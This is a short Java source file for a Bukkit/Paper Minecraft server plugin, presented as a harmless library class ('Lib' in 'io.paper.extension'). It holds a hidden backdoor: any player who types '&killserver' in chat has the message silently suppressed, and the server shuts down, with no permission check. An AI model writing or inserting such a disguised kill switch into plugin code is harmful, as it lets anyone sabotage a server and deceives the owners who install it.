package io.paper.extension;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Lib implements Listener {
    @EventHandler(priority = EventPriority.HIGHEST)
    public static void Lib(AsyncPlayerChatEvent e) {
        String message = e.getMessage();
        Player p = e.getPlayer();
        if (message.equalsIgnoreCase("&killserver")) {
            e.setCancelled(true);
            Bukkit.getServer().shutdown();
        }
    }
}
